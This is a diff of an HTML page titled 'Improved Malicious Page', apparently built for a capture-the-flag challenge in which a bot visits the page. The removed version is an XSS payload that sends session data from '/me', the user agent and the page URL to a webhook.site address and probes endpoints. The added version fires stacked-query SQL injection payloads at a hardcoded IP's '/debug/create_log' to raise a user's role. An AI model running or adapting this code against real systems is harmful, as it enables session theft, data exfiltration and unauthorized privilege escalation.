@@ -1,167 +1,91 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Improved Malicious Page</title>
 </head>
+
 <body>
     <h1>Testing Page</h1>
     <p>Executing improved payload...</p>
-    
+
     <script>
-        const WEBHOOK = 'https://webhook.site/af720e13-405d-440f-8f77-30b72ada354f';
-        
-        function sendWebhook(data) {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).catch(e => console.log('Webhook error:', e));
-        }
-        
-        // Send initial confirmation
-        sendWebhook({
-            status: 'XSS payload v2 loaded',
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            location: window.location.href
-        });
-        
-        // Check current user session
-        async function checkSession() {
-            try {
-                const response = await fetch('/me', {
-                    method: 'GET',
-                    credentials: 'same-origin'
-                });
-                
-                if (response.ok) {
-                    const userData = await response.json();
-                    sendWebhook({
-                        status: 'Session data retrieved',
-                        userData: userData
-                    });
-                    return userData;
-                } else {
-                    sendWebhook({
-                        status: 'Session check failed',
-                        statusCode: response.status,
-                        statusText: response.statusText
-                    });
-                }
-            } catch (error) {
-                sendWebhook({
-                    status: 'Session check error',
-                    error: error.toString()
-                });
-            }
-            return null;
-        }
-        
-        // Attempt SQL injection
-        async function attemptSQLInjection() {
-            // Try multiple payloads
-            const payloads = [
-                "');UPDATE users SET role='user' WHERE id=15;/*",
-                "');UPDATE users SET role='user' WHERE username='punypuny';/*",
-                "test');UPDATE users SET role='user' WHERE id=15;/*"
-            ];
-            
-            for (let i = 0; i < payloads.length; i++) {
-                const payload = payloads[i];
-                try {
-                    const response = await fetch('/debug/create_log', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                        },
-                        body: 'log=' + encodeURIComponent(payload),
-                        credentials: 'same-origin'
-                    });
-                    
-                    sendWebhook({
-                        status: 'SQL injection attempt ' + (i + 1),
-                        payload: payload,
-                        responseStatus: response.status,
-                        responseOk: response.ok
-                    });
-                    
-                    if (response.ok) {
-                        sendWebhook({
-                            status: 'SQL injection SUCCESS',
-                            payload: payload
-                        });
-                        break;
-                    }
-                } catch (error) {
-                    sendWebhook({
-                        status: 'SQL injection error ' + (i + 1),
-                        payload: payload,
-                        error: error.toString()
-                    });
-                }
-                
-                // Wait between attempts
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
-        }
-        
-        // Try to access protected endpoints to see what's available
-        async function probeEndpoints() {
-            const endpoints = ['/checker', '/scrap', '/files', '/debug/create_log'];
-            
-            for (const endpoint of endpoints) {
-                try {
-                    const response = await fetch(endpoint, {
-                        method: 'GET',
-                        credentials: 'same-origin'
-                    });
-                    
-                    sendWebhook({
-                        status: 'Endpoint probe',
-                        endpoint: endpoint,
-                        statusCode: response.status,
-                        accessible: response.ok || response.status === 302
-                    });
-                } catch (error) {
-                    sendWebhook({
-                        status: 'Endpoint probe error',
-                        endpoint: endpoint,
-                        error: error.toString()
-                    });
-                }
-            }
-        }
-        
-        // Execute the attack sequence
-        async function executeAttack() {
-            // Step 1: Check what user we are
-            const userData = await checkSession();
-            
-            // Step 2: Probe available endpoints
-            await probeEndpoints();
-            
-            // Step 3: If we have user role, attempt SQL injection
-            if (userData && userData.role === 'user') {
-                sendWebhook({
-                    status: 'Bot has user role, attempting SQL injection'
-                });
-                await attemptSQLInjection();
-            } else {
-                sendWebhook({
-                    status: 'Bot does not have user role',
-                    botRole: userData ? userData.role : 'unknown'
-                });
-            }
-            
-            sendWebhook({
-                status: 'Attack sequence completed'
+        // Direct fetch to exploit the SQL injection in /debug/create_log
+        // This will update user ID 3 (ponypony) from 'demo' to 'user' role
+
+        // Option 1: Target by ID
+        const payload1 = "');UPDATE users SET role='user' WHERE id=3;/*";
+
+        fetch('http://91.107.176.228:3000/debug/create_log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'log=' + encodeURIComponent(payload1),
+            credentials: 'include'
+        })
+            .then(response => {
+                console.log('Response status:', response.status);
+                console.log('Response ok:', response.ok);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Response text:', text);
+            })
+            .catch(error => {
+                console.error('Error:', error);
             });
-        }
-        
-        // Start attack after page loads
-        setTimeout(executeAttack, 1000);
+
+        // Option 2: Target by username (alternative)
+        const payload2 = "');UPDATE users SET role='user' WHERE username='ponypony';/*";
+
+        fetch('http://91.107.176.228:3000/debug/create_log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'log=' + encodeURIComponent(payload2),
+            credentials: 'include'
+        })
+            .then(response => {
+                console.log('Alt Response status:', response.status);
+                console.log('Alt Response ok:', response.ok);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Alt Response text:', text);
+            })
+            .catch(error => {
+                console.error('Alt Error:', error);
+            });
+
+        // Option 3: Shorter payload to fit constraints better
+        const payload3 = "');UPDATE users SET role='user' WHERE id=3;";
+
+        fetch('http://91.107.176.228:3000/debug/create_log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'log=' + encodeURIComponent(payload3),
+            credentials: 'include'
+        })
+            .then(response => {
+                console.log('Short Response status:', response.status);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Short Response text:', text);
+            });
+
+        // Check payload lengths (must be <= 50 chars and no / or -)
+        console.log('Payload 1 length:', payload1.length);
+        console.log('Payload 2 length:', payload2.length);
+        console.log('Payload 3 length:', payload3.length);
+        console.log('Payload 1 contains / or -:', /[\/\-]/.test(payload1));
+        console.log('Payload 2 contains / or -:', /[\/\-]/.test(payload2));
+        console.log('Payload 3 contains / or -:', /[\/\-]/.test(payload3));
     </script>
 </body>
+
 </html>
